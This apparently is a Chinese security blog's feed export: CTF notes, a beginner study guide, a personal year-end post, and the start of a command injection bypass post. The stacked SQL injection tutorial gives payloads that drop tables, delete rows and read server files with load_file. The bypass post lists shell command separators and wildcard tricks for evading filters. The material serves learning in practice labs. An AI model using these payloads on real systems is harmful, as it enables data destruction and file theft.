<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvj0vjj311l0ckjsn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvj0vjj311l0ckjsn.jpg" class="lazyload"></a></p>
<p>解码得到flag</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>堆叠查询注入学习</title>
    <url>/yakko117/2019/10/30/stack_sql_injection/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="说在前面的一些东西"><a href="#说在前面的一些东西" class="headerlink" title="说在前面的一些东西"></a>说在前面的一些东西</h1><p>做题时遇到了一道结合堆叠注入的题目，拜读了师傅们的wp，和技术分析详解，自己总结了一些东西，用以记录学习<br><a href="http://www.sqlinjection.net/stacked-queries/">堆叠注入原文</a><br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">0nth3way师傅的理解</a><br>题目可以去BUUCTF，去看看2019强网杯的 <code>随便注</code><br><a href="https://buuoj.cn/challenges">BUUCTF靶场</a></p>
<hr>
<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>在SQL中，分号<code>;</code>是用来表示一条sql语句的结束。试想一下我们在 <code>;</code> 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而<code>union injection</code>（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<code>union</code>或者 <code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12metxxj30n8047dfx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12metxxj30n8047dfx.jpg" class="lazyload"></a></p>
<hr>
<h2 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mfdsnj30iw03f74b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mfdsnj30iw03f74b.jpg" class="lazyload"></a></p>
<p>原作者说不支持mysql+php， 但是我在使用 <code>php7.0+</code> 版本时，是可以执行的，大概是和原文作者在使用程序版本不同的原因造成的情况。虽然堆叠注入可以执行任意命令语句，但是此种注入方式并不是万能的。在web系统中，代码通常只返回一个查询结果，因此堆叠注入的第二个语句产生错误或者结果会被忽略，在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<hr>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sno <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">create</span> <span class="keyword">table</span> test1 <span class="keyword">like</span> student;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mks5zj30t30a5jt5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mks5zj30t30a5jt5.jpg" class="lazyload"></a></p>
<p>执行成功，我们再去看一下是否新建成功表。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mkunrj30sd0byjt9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mkunrj30sd0byjt9.jpg" class="lazyload"></a></p>
<p>发现存在新建的表 <code>test1</code>；</p>
<hr>
<h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sno <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">drop</span> <span class="keyword">table</span> test1;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mi0s6j30nz06xt97.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mi0s6j30nz06xt97.jpg" class="lazyload"></a></p>
<p>查看表， 发现test1 已被删除</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mj4y3j30mm06074v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mj4y3j30mm06074v.jpg" class="lazyload"></a></p>
<hr>
<h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sno<span class="operator">=</span><span class="number">1</span>; <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mm4kxj30o2052mxj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mm4kxj30o2052mxj.jpg" class="lazyload"></a><br>PS: result1 还是正常查询</p>
<hr>
<h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sno<span class="operator">=</span><span class="number">1</span>; <span class="keyword">select</span> load_file(<span class="string">&#x27;D:/phpstudy/PHPTutorial/WWW/flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" class="lazyload"></a></p>
<hr>
<h4 id="5-修改数据"><a href="#5-修改数据" class="headerlink" title="(5)修改数据"></a>(5)修改数据</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sno<span class="operator">=</span><span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> student(Sno,Sname,Sex, Age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;100&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;ma&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" class="lazyload"></a></p>
<p>可以看到刚刚添加的数据</p>
<hr>
<p>除了<code>mysql</code>，<code>Postgresql</code>， <code>SQL server</code> 同样可以进行堆叠注入，<code>Oracle</code>不行，具体操作都一样</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门学习总结（误）</title>
    <url>/yakko117/2019/04/02/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h2 id="零基础的我，如何入门"><a href="#零基础的我，如何入门" class="headerlink" title="零基础的我，如何入门"></a>零基础的我，如何入门</h2><p>首先问自己几个问题：</p>
<ul>
<li>我会自学吗？</li>
<li>遇到问题时，是否会善于通过百度等方法解决吗？</li>
<li>在只有英文文献资料时，自身水平不行时，是否会用翻译软件一点一点去读？</li>
<li>在向他人询问问题时，是否注意过问问题的礼仪细节？（礼貌问题，以及会将问题表述清楚，遇到了哪些问题，尝试了什么方法，结果如何都表述清楚；而不是简单的一句话：这怎么弄？）</li>
<li>在面对问题无法解决，长期学习效果不佳时，是否会咬牙坚持下去；在身边同学都在玩着游戏，上完课可以好好休息看看手机，周末约好出去游玩时，自己是否会沉下心来学习吗？</li>
</ul>
<hr>
<p>没有基础如何入门，如何学安全，如何日站<br>首先，最重要的一定是<strong>学好编程、学好编程、学好编程</strong>。无数满怀憧憬的萌新都死在了这（笔者本人编程基础也不怎么好），觉得编程枯燥，没意思，然后就放弃了；编程语言作为基础，如果不会和计算机交流，就没必要再去说后续的挖洞和渗透了，当你连简单的代码审计都做不到，如何去判断漏洞为SQL注入，还是xss等等；<strong>所以请先从编程开始入手学习，一定要弄明白自己到底想要的是什么，保持一颗虔诚向学的心。</strong>（OS:我还做不到）</p>
<p>关于编程语言，推荐以下三种：（有能力自我学习更多更好）</p>
<ul>
<li>C:作为万物之源（误），好好的学C,不仅仅是对web安全有帮助。<br>: **<del>PHP是世界上最好的语言</del>**，现阶段web code audit最常见的语言，不求掌握，但一定要去学会识别函数，学会代码审计；</li>
<li>Python: <del>绝对是最好入门的语言了，没有之一。可以在很短时间内写出很实用的工具，也很推荐，但是请记住，<strong>一定要抽时间来学习C语言！</strong></del></li>
</ul>
<p>平常可以看一些关于安全的新闻，了解一下比较热门的安全技术，关注一下最新的漏洞；这样以后当你不知道学什么的时候，这些技术就是你要学的东西，但是请注意，一定要打好基础，不要急于求成，今天还在学1+1&#x3D;2，第二天想去学会泰勒公式，怎么可能？</p>
<hr>
<h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><h3 id="推荐书籍（我个人觉得不错的一些书，有待补充）"><a href="#推荐书籍（我个人觉得不错的一些书，有待补充）" class="headerlink" title="推荐书籍（我个人觉得不错的一些书，有待补充）"></a>推荐书籍（我个人觉得不错的一些书，有待补充）</h3><p><a href="https://pan.baidu.com/s/1zdA2dQBXqUG9hkch2uel_g">Web安全深度剖析</a>  提取码：i3ua<br><a href="https://pan.baidu.com/s/18wYknvl1lA1-lyvXSdNQ5g">Kali渗透测试技术详解</a>  提取码：od9r<br><a href="https://pan.baidu.com/s/1pVjBe6vGSLE5p54Nbi7eZQ">xss跨站脚本攻击剖析</a> 提取码：63o9<br><a href="https://pan.baidu.com/s/16lfw-YFpSTSKsrsKlZU_fA">SQL注入攻击与防御</a> 提取码：uenu<br><a href="https://pan.baidu.com/s/1u-V477lMYYh3Fa3ODGM3MA">常见工具使用手册</a> 提取码：3om1<br><a href="https://www.cnblogs.com/mengwang024/p/4425834.html">TCP&#x2F;IP详解卷1：协议</a><br><a href="https://github.com/riusksk/secbook">信息安全从业者书单推荐</a></p>
<hr>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><a href="http://phpstudy.php.cn/">phpstudy</a><br><a href="http://pan.baidu.com/s/1jH4WlMY">sqli-labs-master</a> 提取码：11mj<br><a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br><a href="https://github.com/binarever/dwva">dwva</a><br><a href="https://pan.baidu.com/s/1Za1iIuniIeMVw0lGm-6S9w">测试工具</a> 提取码：7num<br>…<br>以及学会自己搭一些简单的站，如:织梦cms这类的，去看看其源码，去看看那些功能性代码是如何实现的，然后去网上搜一搜一些框架不同版本的漏洞，git上也有很多大佬自己写的一些环境，都值得去花时间学</p>
<hr>
<h3 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h3><p><a href="https://www.ichunqiu.com/">i春秋</a> 国内外的赛题（wp部分自带）<br><a href="http://www.shiyanbar.com/">实验吧</a> 偏基础，但是平台服务器有时候有问题<br><a href="https://www.kanxue.com/chm.htm">看雪ctf</a> 赛题<br><a href="https://www.xctf.org.cn/">XCTF 社区</a> 都是赛题，攻防世界的题目（都有wp）<br><a href="https://www.linkedbyx.com/">安恒x计划平台</a>  安恒赛题（wp要自己找）<br><a href="http://ctf.nuptzj.cn/">南邮ctf</a>  偏基础，适合初学(wp百度都有)<br><a href="http://sec.hdu.edu.cn/">杭电ctf</a> 重点是Hgame-week-ctf<br><a href="http://hackinglab.cn/">国家信息安全攻防学习平台</a><br><a href="https://ctf.bugku.com/">BugkuCTF</a> 适合（wp部分可以百度）<br><a href="http://www.wechall.net/">WeChall</a><br><a href="https://buuoj.cn/">BuuCTF</a> <strong>力推赵师傅的赛题网站</strong><br><a href="http://www.hetianlab.com/">合天网安实验室</a> 没试过<br><a href="http://wargame.kr/challenge">Wargame.kr</a> 韩国的ctf题，有些东西，但是wp比较少<br><a href="https://leetcode-cn.com/">leet-code</a> 这是算法类的学习网站<br><a href="https://www.csdn.net/">CSDN</a><br><a href="https://www.cnblogs.com/">博客园</a><br><a href="https://www.52pojie.cn/">吾爱破解</a><br><a href="http://www.itdaan.com/index.html">开发者知识库</a></p>
<hr>
<h3 id="学习工具"><a href="#学习工具" class="headerlink" title="学习工具"></a>学习工具</h3><p><a href="https://tools.pediy.com/">看雪工具</a><br><a href="https://down.52pojie.cn/Tools/">52破解</a><br><a href="http://ctf.ssleye.com/">CTF 在线工具 by CTFcode</a><br><a href="http://tool.bugku.com/">CTF 在线工具箱 by bugku</a><br><a href="https://ctftools.com/down/">CTF 工具资源库 by HBCTF team</a><br><a href="https://msdn.itellyou.cn/">虚拟机环境</a><br><a href="https://www.baidu.com/">中国最强搜索引擎</a></p>
<hr>
<h3 id="多看看大佬的blog"><a href="#多看看大佬的blog" class="headerlink" title="多看看大佬的blog"></a>多看看大佬的blog</h3><p>微笑师傅：<a href="https://www.smi1e.top/">https://www.smi1e.top/</a><br>郁离歌师傅：<a href="http://120.79.189.7/">http://120.79.189.7/</a><br>P神：<a href="https://www.leavesongs.com/">https://www.leavesongs.com/</a><br>一叶飘零师傅：<a href="https://skysec.top/">https://skysec.top/</a><br>夜莫离师傅：<a href="https://yml-sec.top/">https://yml-sec.top/</a><br><a href="https://github.com/ctfs">wp合集</a><br><a href="https://github.com/p4-team/ctf">P4-team wp合集</a></p>
<hr>
<h3 id="业内新闻"><a href="#业内新闻" class="headerlink" title="业内新闻"></a>业内新闻</h3><p><a href="https://www.anquanke.com/">安全客</a><br><a href="https://xz.aliyun.com/">先知社区</a><br><a href="https://www.t00ls.net/">T00ls</a><br><a href="http://drops.vidar.club/">Vidar Drops</a><br><a href="https://www.freebuf.com/">Freebuf</a><br><a href="https://www.freebuf.com/">91Ri</a></p>
<hr>
<h2 id="从基础到进阶"><a href="#从基础到进阶" class="headerlink" title="从基础到进阶"></a>从基础到进阶</h2><p>因为笔者也非专业出身，只能说说自己学习方法，看书、做题、写wp，从基础知识开始，一点一点积累，学会自己搭建属于自己的博客，不求别人去看，就当作自己的学习积累总结；要想挖漏洞，就要学会自己写漏洞，只有自己理解漏洞的形成原因，自己理解为什么会产生这样的结果，才会学到知识、掌握方法；多和别人交流，有空去看看大佬们的研究和谈论的内容；尝试去挖洞（然后交补天赚点零钱233），去试着读一读一些CMS，去看一些源码。</p>
<hr>
<h2 id="借用P神的一段话"><a href="#借用P神的一段话" class="headerlink" title="借用P神的一段话"></a>借用P神的一段话</h2><h3 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a><strong>Programming</strong></h3><p>一个不会编程的hacker不是好hacker，努力提高编码水平，接触最前沿的代码思想，构架自己的平台框架。</p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a><strong>Vulnerability</strong></h3><p>没有漏洞就没有安全，安全建立在发现漏洞与解决漏洞之间。世上没有完美的代码，也不会有零漏洞的程序。</p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h3><p>不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>发现一个漏洞，你成功了70%；写出利用代码，完成剩下的30%。行百步者半九十。</p>
<hr>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>新环境的题目还没做完，等全部做完了，再更wp吧，最近作业和要看的书任务量有点大，等清明放假再好好来做题研究， 就这样了,以后有什么要补充的，再慢慢来补充算了（逃…<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1on6jm4xzj30c40b2q36.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1on6jm4xzj30c40b2q36.jpg" class="lazyload"></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>你看他身上插满的flag像不像个唱戏的老将军</title>
    <url>/yakko117/2019/02/04/%E4%BD%A0%E7%9C%8B%E4%BB%96%E8%BA%AB%E4%B8%8A%E6%8F%92%E6%BB%A1%E7%9A%84flag%E5%83%8F%E4%B8%8D%E5%83%8F%E4%B8%AA%E5%94%B1%E6%88%8F%E7%9A%84%E8%80%81%E5%B0%86%E5%86%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="18年的狗砸"><a href="#18年的狗砸" class="headerlink" title="18年的狗砸"></a>18年的狗砸</h1><p>打算转网安还是暑假的时候，忙碌的大一时光眨眼就过去，自己处于一种迷茫且不知道如何前进的状态，在无数个十字路口前举步不前时，感谢我姐，陪我聊了许多，也让我有了一个新的目标和方向，让我从咸鱼王变成了另一个方向的咸鱼&gt;w&lt;；这一年我很幸运遇到了很多很多很多很多帮助过我的人，无论是曾经的新媒体的朋友，或是网络中心的老师、学长还是那群嚷嚷着要“投湖”的基友，真的很感谢你们对我的包容和照顾,使我从初入大学一脸懵的萌新，变成能在群里看dalao操作的死咸鱼。（雾</p>
<hr>
<blockquote>
<p>要想真正进入一个圈子，首先自己要成为那样的人。 要想过好这一生，自己就要努力成为一个厉害的人。 人脉不是你认识多少人而是有多少人想认识你。不执念于虚名，不迷恋于人脉，不着急于一步登天，踏踏实实耕耘自己的人生。<br><strong>毕竟，这是一个信仰实力的时代</strong>！</p>
</blockquote>
<h2 id="flag最多的一年"><a href="#flag最多的一年" class="headerlink" title="flag最多的一年"></a>flag最多的一年</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lblyhj31400u078z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lblyhj31400u078z.jpg" class="lazyload"></a></p>
<hr>
<p><strong>“我一定要把博客搭好！”</strong>这句喊了一年的话，终于在寒假实现了，从十月第一次听说ctf，到现在慢慢开始记录<code>write up</code>（虽然还没有放上来233）、开始以龟速划水前行，<strong>成长</strong>这条道路,我才刚刚开始上路。</p>
<p>今年陆陆续续打了几场比赛，也躺了个奖（自己是真的菜），基本上在比赛时自己就是一脸懵的看着题目和感慨大佬神乎其神的操作，但也因此认识了各地的师傅，也激发起自己学习的动力，明确了目标。记得前几天还说，要在过年前记录php序列化的学习过程，在网上看了许多dalao的博客总结后，结果到今天，自己才<strong>可耻</strong>的写下了一个title<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lan0rj30u0139gqf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lan0rj30u0139gqf.jpg" class="lazyload"></a> width&#x3D;”20%” height&#x3D;”20%”&gt;<br>尽量过几天赶出来吧，大年初一、初二要出去拜年，争取在初六和朋友们出去玩之前写一部分吧。</p>
<hr>
<h2 id="19年的flag"><a href="#19年的flag" class="headerlink" title="19年的flag"></a>19年的flag</h2><ul>
<li>坚持学习，坚持把学习成果记录总结</li>
<li>多写代码，自己学会写漏洞环境，学习代码审计</li>
<li>除了web方向，开始学习RE</li>
<li>注意身体，少熬夜</li>
<li>努力向XCTF发起挑战</li>
</ul>
<hr>
<p>好了，就这样吧，配家里人看春晚去了</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>命令注入绕过姿势</title>
    <url>/yakko117/2019/04/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考文章如下<br><a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">微笑师傅</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw">Zedd师傅</a></p>
<h1 id="Linux通配符"><a href="#Linux通配符" class="headerlink" title="Linux通配符"></a>Linux通配符</h1><p><code>?</code> : 匹配任何一个字符</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat fl??</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>*</code> : 匹配任何字符串&#x2F;文本，包括空字符串</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat fl**</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>[ ]</code> : 匹配范围中任何一个字符<br><code>[a-z]</code> ：匹配a-z范围中任何一个字符</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat fl[abc]g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line"></span><br><span class="line">$ cat fl[a-z]g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>&#123;a,b,c&#125;</code> : 对以逗号分隔的文件列表进行拓展</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat fl&#123;a,b,c&#125;g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line">cat: flbg: 没有那个文件或目录</span><br><span class="line">cat: flcg: 没有那个文件或目录</span><br><span class="line"></span><br><span class="line">$ &#123;cat,flag,flbg&#125;</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line">cat: flbg: 没有那个文件或目录</span><br></pre></td></tr></table></figure></div>

<p><code>&#123; &#125;</code> 与 <code>[ ]</code> 有比较大的区别。当匹配的文件不存在时，<code>[ ]</code> 会失去模式功能，变成一个单纯的字符串，而 <code>&#123; &#125;</code> 依然可以展开； 这里我新建一个<code>a.txt</code>； </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls [ab].txt</span><br><span class="line">a.txt</span><br><span class="line"></span><br><span class="line">$ ls [bc].txt</span><br><span class="line">ls: 无法访问&#x27;[bc].txt&#x27;: 没有那个文件或目录</span><br><span class="line"></span><br><span class="line">$ ls &#123;a,b&#125;.txt</span><br><span class="line">ls: 无法访问&#x27;b.txt&#x27;: 没有那个文件或目录</span><br><span class="line">a.txt</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h1><h2 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0a</span><br><span class="line">%0d</span><br><span class="line">;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">$(shell_command)`shell_command`&#123;shell_command,&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">%1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><h3 id="使用-lt-或-gt"><a href="#使用-lt-或-gt" class="headerlink" title="使用 &lt; 或 &gt;"></a>使用 <code>&lt;</code> 或 <code>&gt;</code></h3><p><code>cmd &lt;&gt; file</code> 以读写模式将文件 <code>file</code> 重新定向到输出，文件 <code>file</code> 不会被破坏。只有当应用程序利用这一特性时，它才有意义。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat&lt;flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ cat&lt;&gt;flag # 需要提权</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

